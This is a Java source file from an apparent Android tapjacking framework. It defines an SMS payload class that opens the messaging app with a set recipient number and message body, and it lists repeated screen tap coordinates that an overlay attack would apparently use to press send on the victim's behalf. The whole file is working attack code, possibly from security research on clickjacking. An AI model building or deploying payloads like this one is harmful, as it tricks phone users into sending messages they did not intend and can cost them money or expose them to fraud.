package com.tapjacking.payloads;

import com.tapjacking.framework.FrameworkPayload;
import android.content.Intent;
import android.graphics.Point;
import android.net.Uri;

public class SMSPayload extends FrameworkPayload {
	public SMSPayload() {
		for(int i=0; i<=6; i++)
			positions.add(new Point(350, 610));
	}

	@Override
	public Intent getIntent() {
		Intent intent = new Intent(Intent.ACTION_VIEW);
		intent.setData(Uri.parse("sms: 666-999-666"));
		intent.putExtra("sms_body", "YAP!");
		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		return intent;
	}

	@Override
	public int getSleep() {
		return 1000;
	}
}